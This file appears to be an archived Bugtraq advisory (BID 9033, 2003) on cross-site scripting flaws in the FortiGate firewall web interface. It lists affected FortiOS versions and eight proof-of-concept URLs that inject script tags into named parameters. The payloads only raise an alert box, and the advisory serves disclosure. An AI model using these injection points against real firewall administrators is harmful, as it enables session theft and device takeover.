@@ -1,0 +1,103 @@
+#SpeeDr00t@Black Falcon<br>#bid9033<p><b><span style="font-size: 18pt;">FortiGate Firewall Web Interface Cross-Site Scripting Vulnerabilities</span></b></p><br><br><a href="http://www.securityfocus.com/bid/9033/info">info</a><br><a href="http://www.securityfocus.com/bid/9033/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/9033/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/9033/solution">solution</a><br><a href="http://www.securityfocus.com/bid/9033/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				9033
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Input Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Nov 12 2003 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Nov 12 2003 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				Discovery is credited to "Maarten Hartsuijker" &lt;maartenh@phreaker.net&gt;.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					Fortinet FortiOS 2.50 <br/>
+					
+				
+					Fortinet FortiOS 2.36 <br/>
+					
+				
+					Fortinet FortiOS 2.5 0MR4<br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+				
+					Fortinet FortiOS 2.50 MR5<br/>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	The following examples were provided:<br/><br/>https://www.example.com/firewall/policy/dlg?q=-1&amp;fzone=t&lt;script&gt;alert('oops')&lt;/script&gt;&gt;&amp;tzone=dmz<br/><br/>https://www.example.com/firewall/policy/policy?fzone=internal&amp;tzone=dmz1&lt;script&gt;alert('oops')&lt;/script&gt;<br/><br/>https://www.example.com/antispam/listdel?file=blacklist&amp;name=b&lt;script&gt;alert('oops')&lt;/script&gt;&amp;startline=0<br/><br/>https://www.example.com/antispam/listdel?file=whitelist&amp;name=a&lt;script&gt;alert('oops')&lt;/script&gt;&amp;startline=0(naturally)<br/><br/>http://www.example.com/theme1/selector?button=status,monitor,session"&gt;&lt;script&gt;alert('oops')&lt;/script&gt;&amp;button_url=/system/status/status,/system/status/moniter,/system/status/session<br/><br/>http://www.example.com/theme1/selector?button=status,monitor,session&amp;button_url=/system/status/status"&gt;&lt;script&gt;alert('oops')&lt;/script&gt;,/system/status/moniter,/system/status/session<br/><br/>http://www.example.com/theme1/selector?button=status,monitor,session&amp;button_url=/system/status/status,/system/status/moniter"&gt;&lt;script&gt;alert('oops')&lt;/script&gt;,/system/status/session<br/><br/>http://www.example.com/theme1/selector?button=status,monitor,session&amp;button_url=/system/status/status,/system/status/moniter,/system/status/session"&gt;&lt;script&gt;alert('oops')&lt;/script&gt;
+	
+		<ul>
+</ul>
+</div>
